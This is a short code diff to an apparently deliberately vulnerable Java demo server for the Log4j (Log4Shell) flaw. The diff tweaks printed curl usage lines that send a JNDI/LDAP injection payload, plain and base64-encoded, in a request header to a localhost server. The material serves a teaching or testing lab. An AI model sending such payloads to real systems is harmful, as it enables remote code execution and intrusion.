@@ -30,7 +30,7 @@ public class Log4jWebServer {
     System.out.println("curl -H 'log_me_b64: JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS8jTU1fMTI3XzBfMF8xXzQ0NDR9Cg==' http://127.0.0.1:8888/");
     System.out.println("");
     System.out.println("On a linux system with base64 installed you can also use : ");
-    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64`\" http://127.0.0.1:8888/");
+    System.out.println("curl -H \"log_me_b64: `echo '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' | base64 -w 0`\" http://127.0.0.1:8888/");
     System.out.println("");
 
     int port = 8888;
